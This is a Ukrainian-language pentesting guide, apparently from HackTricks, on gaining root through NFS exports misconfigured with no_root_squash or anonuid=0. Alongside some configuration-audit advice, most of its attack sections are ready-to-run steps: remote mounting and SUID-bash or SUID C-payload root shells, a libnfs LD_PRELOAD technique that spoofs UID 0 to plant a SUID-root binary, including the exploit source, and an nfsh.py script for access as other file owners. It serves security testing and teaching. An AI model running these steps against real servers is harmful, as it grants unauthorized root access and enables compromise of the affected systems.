# Ескалація привілеїв через неправильне налаштування NFS No Root Squash

{{#include ../../banners/hacktricks-training.md}}

## Основні відомості про Squashing

У NFS AUTH_SYS/AUTH_UNIX сервер перевіряє дозволи на файли на основі `uid` і `gid`, переданих у кожному RPC-запиті. Інші типи автентифікації, як-от Kerberos, використовують інші облікові дані, а сервер може зіставляти числові облікові дані перед перевіркою дозволів.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: зіставляє всі UID і GID з анонімним обліковим записом, який у Linux за замовчуванням — `nobody` (65534). `no_all_squash` є типовим значенням для запитів, що не надходять від root.<sup>[[4]](#references)</sup>
- **`root_squash`**: у Linux це типове значення. Воно зіставляє запити з UID/GID 0 (root) з анонімним обліковим записом; інші UID і GID не squashed.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: вимикає squashing для root, тож запити з UID/GID 0 можуть оброблятися на сервері від імені root.<sup>[[4]](#references)</sup>

Якщо дозволений клієнт може змонтувати доступний для запису експорт у **`/etc/exports`**, налаштований із **`no_root_squash`**, його запити з UID/GID 0 зможуть записувати туди від імені root-користувача сервера.<sup>[[4]](#references)</sup>

`root_squash` зіставляє лише UID/GID 0; за AUTH_SYS **ненульові числові UID/GID** дозволеного клієнта все ще можуть відповідати іншому обліковому запису на сервері. Тому доступний для запису експорт може стати шляхом між користувачами навіть із root squashing, якщо клієнт може створити файл із таким числовим ідентифікатором, а сервер дозволяє доступ. Для передачі через SUID/SGID також перевірте власника створеного файла, доступ до виконання, стан `nosuid` на монтуванні сервера, ACL та SELinux або інші політики. Самі по собі шлях експорту, параметр `rw` або збіг числових ідентифікаторів не доводять, що клієнт має доступ, експорт активний або обидва хости використовують однакове ефективне зіставлення ідентичностей. Переглядайте `/etc/exports` і локальні метадані пасивно; під час переліку не монтуйте новий ресурс і не створюйте тестовий файл.<sup>[[4]](#references)[[5]](#references)</sup>

Докладніше про **NFS** дивіться:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Анонімне зіставлення, еквівалентне root

Не перевіряйте лише наявність `no_root_squash`. За налаштування `root_squash,anonuid=0,anongid=0` запит клієнта з UID/GID 0 після squashing **знову стає root**. За налаштування `all_squash,anonuid=0,anongid=0` навіть ідентичності клієнта, що не є root, зіставляються на сервері з root. На доступному для запису експорті `sec=sys` будь-яка з цих конфігурацій може забезпечити примітив створення файла, власником якого є root, для описаної нижче передачі через SUID; обмеження щодо дозволених клієнтів і монтування на цільовій системі залишаються чинними.<sup>[[4]](#references)</sup>

На сервері використайте `exportfs -v`, щоб переглянути активний експорт і параметри для **відповідного клієнта**, зокрема `rw`, `sec=`, режим squash та `anonuid`/`anongid`. Також перегляньте `/etc/exports.d/*.exports` під час перевірки конфігурації: одного `/etc/exports` може бути недостатньо.<sup>[[4]](#references)[[6]](#references)</sup>

```bash
# Example /etc/exports entries: squashed requests map to server UID 0
/srv/share 192.0.2.10(rw,sec=sys,root_squash,anonuid=0,anongid=0)
/srv/share 192.0.2.11(rw,sec=sys,all_squash,anonuid=0,anongid=0)
```

### Віддалена експлуатація

Option 1 using bash:
- На дозволеному клієнті змонтуйте експорт із правом запису від імені root, скопіюйте до нього **`/bin/bash`**, установіть для нього біт **SUID** і запустіть його з монтування на цільовій системі, де не використовується `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
    - Щоб завантажений файл залишився у власності root, сервер має зберігати UID клієнта 0 за допомогою **`no_root_squash`** або зіставляти запит із UID 0 за допомогою **`anonuid=0`**. Інакше створити SUID-бінарний файл для іншого облікового запису можна лише тоді, коли клієнт може створити файл або стати його власником із числовими UID/GID цього облікового запису.<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Option 2 using compiled C code:
- Змонтуйте каталог із дозволеного клієнта, скопіюйте туди скомпільований payload, який зловживає дозволами SUID, установіть його біт **SUID** і виконайте його на victim (див. кілька [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
    - Ті самі обмеження, що й раніше

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Локальний експлойт

> [!TIP]
> Зверніть увагу: якщо ви можете створити **тунель зі своєї машини до машини жертви, ви все одно можете використати віддалену версію для експлуатації цієї ескалації привілеїв, тунелюючи потрібні порти**.\
> Наступний трюк корисний, коли `/etc/exports` обмежує експорт IP-адресою жертви: віддалений клієнт не може змонтувати його, але локальна техніка може працювати через спільний ресурс, уже змонтований на дозволеному хості.<sup>[[2]](#references)</sup>\
> Для цього методу libnfs без привілеїв експорт у **`/etc/exports`** має використовувати прапорець `insecure`, щоб процес міг використовувати незарезервований вихідний порт; за замовчуванням використовується `secure`, однак процесу, здатному прив’язатися до зарезервованого порту, цей параметр не потрібен.<sup>[[1]](#references)[[4]](#references)</sup>

### Основна інформація

Клієнт NFSv3 AUTH_UNIX передає свій ефективний UID, GID і групи в кожному виклику, а сервер використовує їх для перевірки дозволів. Ця локальна техніка зловживає цією моделлю, підробляючи облікові дані RPC через [libnfs](https://github.com/sahlberg/libnfs); її модуль preload підтримує перевизначення UID/GID у контексті NFS.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Компіляція бібліотеки

Приклад libnfs може потребувати коригувань для цільового ядра; у наведеній інструкції окремо зазначено, що перед компіляцією модуля preload потрібно закоментувати системні виклики fallocate.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Виконання експлойту

У прикладі створюється невеликий допоміжний файл на C, який запускає shell, потім розміщується на спільному ресурсі та використовується `ld_nfs.so` з UID 0 у контексті NFS, щоб зробити його SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Скомпілюйте код експлойту:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Розмістіть експлойт у спільному каталозі та змініть його дозволи, підробивши UID**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Виконайте exploit, щоб отримати привілеї root**.<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### Бонус: NFShell для прихованого доступу до файлів

Після отримання доступу root цей шаблон `nfsh.py` встановлює ефективний UID цільового файлу перед виконанням команди, надаючи доступ без рекурсивної зміни власника.<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

Запустіть так:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```



## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Історія про менш відомий спосіб підвищення привілеїв через NFS](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — сторінка посібника Linux](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: специфікація протоколу NFS версії 3](https://datatracker.ietf.org/doc/html/rfc1813)
- [6] [exportfs(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/exportfs.8.html)
{{#include ../../banners/hacktricks-training.md}}
